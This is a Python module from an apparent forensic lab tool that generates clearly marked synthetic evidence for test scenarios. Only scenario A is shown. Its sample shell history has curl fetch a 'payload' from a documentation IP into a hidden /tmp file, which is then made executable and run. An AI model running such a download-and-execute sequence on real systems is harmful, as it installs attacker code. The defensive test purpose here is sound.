"""
Synthetic evidence for six lab scenarios.

Each scenario is a function that returns collector-shaped evidence with fixed
timestamps and fixed hashes, so the same scenario always produces the same
findings and a test can assert on them exactly.

The evidence is shaped like real collector output but is not real. Two things
keep that visible at every layer: every event's `source` begins with SYNTHETIC,
and every record carries `synthetic: True`. A scenario is never written into a
real investigation without that marker travelling with it.
"""

from __future__ import annotations

import hashlib
from datetime import datetime, timedelta, timezone

from analysis.execution_model import (
    ARTIFACT_OBSERVATION, COMMAND_HISTORY, EXECUTION_EVIDENCE, HISTORICAL_EVIDENCE, MODERATE,
    SESSION_EVENT, STRONG, build_event,
)

SYNTHETIC_BANNER = (
    "SYNTHETIC LAB DATA -- This evidence was generated by JOCKY for demonstration and testing. "
    "It did not come from any real machine and must never be presented as if it did.")

#: A fixed point in time so a scenario is reproducible run to run.
EPOCH = datetime(2026, 3, 14, 9, 0, tzinfo=timezone.utc)


def _at(minutes: int) -> str:
    return (EPOCH + timedelta(minutes=minutes)).isoformat()


def _digest(label: str) -> str:
    """A stable fake hash. Derived from the label so it never collides."""
    return hashlib.sha256(f"jocky-synthetic::{label}".encode()).hexdigest()


def _event(source, minutes, **kwargs):
    observed = kwargs.pop("observed", {})
    event = build_event(
        source=f"SYNTHETIC {source}", source_record_id=f"syn-{source}-{minutes}",
        timestamp=_at(minutes), classification=HISTORICAL_EVIDENCE,
        evidence_strength=kwargs.pop("strength", STRONG), provenance=SYNTHETIC_BANNER,
        evidence_kind=kwargs.pop("kind", EXECUTION_EVIDENCE),
        execution_confirmed=kwargs.pop("confirmed", True), observed=observed,
        raw={"synthetic": True}, **kwargs)
    event["synthetic"] = True
    return event


def _artifact(path, *, label=None, size=4096, minutes=0, source="SYNTHETIC artifact collection"):
    filename = path.rsplit("/", 1)[-1]
    return {
        "path": path, "filename": filename,
        "extension": ("." + filename.rsplit(".", 1)[-1].lower()) if "." in filename else None,
        "source": source, "size_bytes": size, "modified": _at(minutes), "created": _at(minutes),
        "hash": _digest(label or path), "hash_algorithm": "sha256",
        "collection_status": "COLLECTED", "indicators": [], "synthetic": True,
    }


def _result(name, title, question, *, events=(), artifacts=(), extra=None, expected=""):
    return {
        "scenario": name, "title": title, "investigative_question": question,
        "synthetic": True, "banner": SYNTHETIC_BANNER, "expected_outcome": expected,
        "execution": {
            "status": "success", "classification": HISTORICAL_EVIDENCE, "synthetic": True,
            "events": list(events), "complete": True,
            "sources": [{"name": "SYNTHETIC lab generator", "status": "AVAILABLE",
                         "detail": SYNTHETIC_BANNER}],
            "warnings": [SYNTHETIC_BANNER],
        },
        "artifacts": {"artifacts": list(artifacts), "synthetic": True, "complete": True,
                      "statistics": {"collected": len(artifacts)}, "warnings": [SYNTHETIC_BANNER]},
        **(extra or {}),
    }


# --- Scenario A ---------------------------------------------------------------
def scenario_a() -> dict:
    """An executable with an unusual name, in an unusual place, that ran."""
    path = "/tmp/.cache/svchost-update"
    events = [
        _event("shell history", 0, kind=COMMAND_HISTORY, confirmed=False, strength=MODERATE,
               observed={"process_name": "curl", "user": "analyst",
                         "full_command_line": f"curl -o {path} http://198.51.100.24/payload",
                         "command_line": f"curl -o {path} http://198.51.100.24/payload"}),
        _event("kernel audit log", 2,
               observed={"process_name": "chmod", "executable": "/usr/bin/chmod", "pid": 4821,
                         "parent_process": "bash", "user": "analyst",
                         "full_command_line": f"chmod +x {path}",
                         "command_line": f"chmod +x {path}"}),
        _event("kernel audit log", 3,
               observed={"process_name": "svchost-update", "executable": path, "pid": 4830,
                         "parent_process": "bash", "parent_pid": 2201, "user": "analyst",
                         "full_command_line": path, "command_line": path,
                         "hash": _digest(path)}),
    ]
    return _result(
        "A", "Suspicious execution from a hidden temporary directory",
        "Did an unusual executable run, and is the file still on disk?",
        events=events, artifacts=[_artifact(path, minutes=1, size=284160)],
        expected=("A Priority 1 lead: execution from a user-writable location, confirmed as having "
                  "run, with a hashed artifact at the same path. A Windows service name under "
                  "/tmp/.cache is a reason to look, not a verdict."))


